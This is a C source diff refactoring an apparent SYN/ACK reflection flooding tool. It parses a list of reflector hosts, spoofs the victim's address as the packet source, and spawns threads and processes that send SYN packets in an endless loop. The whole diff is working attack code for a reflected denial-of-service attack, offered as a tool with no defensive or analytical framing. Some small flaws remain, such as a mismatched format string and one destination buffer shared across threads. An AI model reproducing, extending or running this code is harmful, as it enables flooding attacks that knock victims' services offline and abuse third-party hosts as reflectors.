@@ -198,104 +198,24 @@ static void FreeSYNStructBuff(pSYNStruct input)
     }
 }
 
-static int AttackThread(pInput input)
+static int AttackThread(pSYNStruct syn_struct)
 {
     // now we start the syn flood attack
-    extern void FreeSplitURLBuff(pSplitURLOutput p);
-    extern int SplitURL(const char *url, pSplitURLOutput *output);
 
-    pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
-    pSplitURLOutput split_result;
     int i;
 
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "ATTACK!");
+    DisplayDebug(DEBUG_LEVEL_3, syn_struct->debug_level, "ATTACK!");
 
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "AttackThread start sending data...");
-    pStrNode node = input->str_header->next;
+    DisplayDebug(DEBUG_LEVEL_3, syn_struct->debug_level, "AttackThread start sending data...");
 
-    for (;;)
+    // rport is random source port
+    for (i = 0; i < syn_struct->each_ip_repeat; i++)
     {
-        while (node)
+        if (SendSYN(syn_struct, syn_struct->debug_level))
         {
-            if (!SplitURL(node->str, &split_result))
-            {
-                DisplayError("AttackThread SplitURL failed");
-                return 1;
-            }
-            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
-            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
-            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
-            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
-
-            if (split_result->port == 0)
-            {
-                if (strlen(split_result->host) == 0)
-                {
-                    DisplayError("AttackThread SplitURL not right");
-                    return 1;
-                }
-                // make the port as default
-                split_result->port = ACK_REFLECT_PORT_DEFAULT;
-            }
-            // init the target ip and port
-            syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
-            if (!(syn_struct->dst_ip))
-            {
-                DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
-                return 1;
-            }
-            if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
-            {
-                DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
-                return 1;
-            }
-            if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
-            {
-                DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
-                return 1;
-            }
-            syn_struct->dst_port = split_result->port;
-            FreeSplitURLBuff(split_result);
-            syn_struct->loop = input->each_ip_repeat;
-
-            /* split the target address as the traffic source ip address */
-            // make the source ip as the target ip address
-            if (!SplitURL(input->address, &split_result))
-            {
-                DisplayError("AttackThread SplitURL failed");
-                return 1;
-            }
-            if (split_result->port == 0)
-            {
-                if (strlen(split_result->host) == 0)
-                {
-                    DisplayError("AttackThread SplitURL not right");
-                    return 1;
-                }
-                // make the port as default
-                split_result->port = ACK_REFLECT_PORT_DEFAULT;
-            }
-            if (!strncpy(syn_struct->src_ip, input->address, strlen(input->address)))
-            {
-                DisplayError("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
-                return 1;
-            }
-            syn_struct->src_port = (int)split_result->port;
-
-            // rport is random source port
-            for (i = 0; i < input->each_ip_repeat; i++)
-            {
-                if (SendSYN(syn_struct, input->debug_level))
-                {
-                    DisplayError("AttackThread Attack failed");
-                    return 1;
-                }
-            }
-            FreeSplitURLBuff(split_result);
-            node = node->next;
+            DisplayError("AttackThread Attack failed");
+            return 1;
         }
-        // start again
-        node = input->str_header->next;
     }
     FreeSYNStructBuff(syn_struct);
     return 0;
@@ -313,23 +233,130 @@ int StartACKReflectAttack(const pInput input)
     int status = 0;
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
-
+    extern void FreeSplitURLBuff(pSplitURLOutput p);
+    extern int SplitURL(const char *url, pSplitURLOutput *output);
     extern void SignalExit(int signo);
+
     signal(SIGINT, SignalExit);
+    pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
+    pSplitURLOutput split_result;
+
+    syn_struct->debug_level = input->debug_level;
+    syn_struct->each_ip_repeat = input->each_ip_repeat;
 
     if (!ProcessACKIPListFile(&(input->str_header)))
     {
         DisplayError("ProcessACKIPListFile failed");
         return 1;
     }
+
+    syn_struct->loop = input->each_ip_repeat;
+    pStrNode node;
+
+    /* split the target address as the traffic source ip address */
+    // make the source ip as the target ip address
+    if (!SplitURL(input->address, &split_result))
+    {
+        DisplayError("AttackThread SplitURL failed");
+        return 1;
+    }
+    if (split_result->port == 0)
+    {
+        if (strlen(split_result->host) == 0)
+        {
+            DisplayError("AttackThread SplitURL not right");
+            return 1;
+        }
+        // make the port as default
+        split_result->port = ACK_REFLECT_PORT_DEFAULT;
+    }
+    syn_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
+    if (!(syn_struct->src_ip))
+    {
+        DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+        return 1;
+    }
+    if (!memset(syn_struct->src_ip, 0, IP_BUFFER_SIZE))
+    {
+        DisplayError("AttackThread memset failed: %d(%s)", strerror(errno), errno);
+        return 1;
+    }
+    if (!strncpy(syn_struct->src_ip, input->address, strlen(input->address)))
+    {
+        DisplayError("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
+        return 1;
+    }
+    syn_struct->src_port = (int)split_result->port;
+
     // unlimit loop
+    node = input->str_header->next;
     for (;;)
     {
         // only one process
         if (input->max_process <= 1)
         {
+            // start again
             for (j = 0; j < input->max_thread; j++)
             {
+                /* 
+                 * every thread has onlyone target address
+                 * thread end try next address
+                 */
+                if (!SplitURL(node->str, &split_result))
+                {
+                    DisplayError("AttackThread SplitURL failed");
+                    return 1;
+                }
+
+                // node cicle
+                if (node->next)
+                {
+                    node = node->next;
+                }
+                else
+                {
+                    node = input->str_header->next;
+                }
+
+                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
+                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
+                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
+                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
+
+                if (split_result->port == 0)
+                {
+                    if (strlen(split_result->host) == 0)
+                    {
+                        DisplayError("AttackThread SplitURL not right");
+                        return 1;
+                    }
+                    // make the port as default
+                    split_result->port = ACK_REFLECT_PORT_DEFAULT;
+                }
+                // init the target ip and port
+                syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
+                if (!(syn_struct->dst_ip))
+                {
+                    DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+                    return 1;
+                }
+                if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
+                {
+                    DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
+                    return 1;
+                }
+                if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
+                {
+                    DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
+                    return 1;
+                }
+                syn_struct->dst_port = split_result->port;
+                FreeSplitURLBuff(split_result);
+
+                /*
+                 * end the address
+                 */
+
                 //input->serial_num = (i * input->max_thread) + j;
                 if (pthread_attr_init(&attr))
                 {
@@ -343,7 +370,7 @@ int StartACKReflectAttack(const pInput input)
                     return 1;
                 }
                 // create thread
-                ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
+                ret = pthread_create(&tid[j], &attr, (void *)AttackThread, syn_struct);
                 //printf("j is: %d\n", j);
                 DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
                 // here we make a map
@@ -374,6 +401,61 @@ int StartACKReflectAttack(const pInput input)
                     // child process
                     for (j = 0; j < input->max_thread; j++)
                     {
+                        if (!SplitURL(node->str, &split_result))
+                        {
+                            DisplayError("AttackThread SplitURL failed");
+                            return 1;
+                        }
+
+                        // node cicle
+                        if (node->next)
+                        {
+                            node = node->next;
+                        }
+                        else
+                        {
+                            node = input->str_header->next;
+                        }
+
+                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
+                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
+                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
+                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
+
+                        if (split_result->port == 0)
+                        {
+                            if (strlen(split_result->host) == 0)
+                            {
+                                DisplayError("AttackThread SplitURL not right");
+                                return 1;
+                            }
+                            // make the port as default
+                            split_result->port = ACK_REFLECT_PORT_DEFAULT;
+                        }
+                        // init the target ip and port
+                        syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
+                        if (!(syn_struct->dst_ip))
+                        {
+                            DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+                            return 1;
+                        }
+                        if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
+                        {
+                            DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
+                            return 1;
+                        }
+                        if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
+                        {
+                            DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
+                            return 1;
+                        }
+                        syn_struct->dst_port = split_result->port;
+                        FreeSplitURLBuff(split_result);
+
+                        /*
+                         * end the address
+                         */
+
                         //input->serial_num = (i * input->max_thread) + j;
                         if (pthread_attr_init(&attr))
                         {
@@ -387,7 +469,7 @@ int StartACKReflectAttack(const pInput input)
                             return 1;
                         }
                         // create thread
-                        ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
+                        ret = pthread_create(&tid[j], &attr, (void *)AttackThread, syn_struct);
                         //printf("j is: %d\n", j);
                         DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
                         // here we make a map
@@ -494,8 +576,19 @@ int StartACKReflectTest(const pInput input)
         pthread_join(tid[j], NULL);
     }
     */
-    AttackThreadTest(input);
-    AttackThread(input);
+    if (1 == 2)
+    {
+        // not exec
+        AttackThreadTest(input);
+    }
+    if (!ProcessACKIPListFile(&(input->str_header)))
+    {
+        DisplayError("ProcessACKIPListFile failed");
+        return 1;
+    }
+    pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
+    syn_struct->debug_level = input->debug_level;
+    AttackThread(syn_struct);
 
     return 0;
 }
